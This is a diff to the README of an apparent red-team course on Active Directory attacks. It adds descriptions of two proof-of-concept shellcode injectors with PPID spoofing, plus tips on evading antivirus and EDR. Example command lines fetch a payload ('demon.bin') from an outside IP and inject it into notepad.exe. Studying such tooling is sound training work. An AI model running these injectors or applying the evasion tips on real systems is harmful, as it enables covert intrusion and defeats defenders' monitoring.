@@ -5,6 +5,9 @@ Learn how to compromise an Active Directory Infrastructure by simulating adversa
 
 ## Chapter 2: OPSEC & AV/EDR Evasion
 ### Runner
+Runner is the 1st out of 5 Proof-of-Concept Process Injectors that takes an arbitrary shellcode from a remote URL and perform shellcode injection on a sacrificial process `notepad.exe` using Win32 API calls. It also supports Parent Process ID (PPID) Spoofing, allowing the sacrificial process to spawn under an arbitrary process using it's PID. If the target `-t, --target` is not specified, it will perform self-injection instead.
+
+**OPSEC Tips:** Always close process handles and clean-up attribute lists if PPID spoofing is performed.
 ```
 C:\>Runner.exe -u http://192.168.231.128:9090/demon.bin -t notepad -p 4160 -k
 
@@ -71,6 +74,9 @@ Process Injector 1: Runner (Win32 API)
 ```
 
 ### Clicker
+Clicker is a Proof-of-Concept loader for code injection using NT\*API calls 
+
+**OPSEC Tips:** Allocating RWX region is bad OPSEC. Always allocate RW then flip it to RX.
 ```
 C:\>Clicker.exe -u http://192.168.231.128:9090/demon.bin -t notepad -p 4160 -k
 
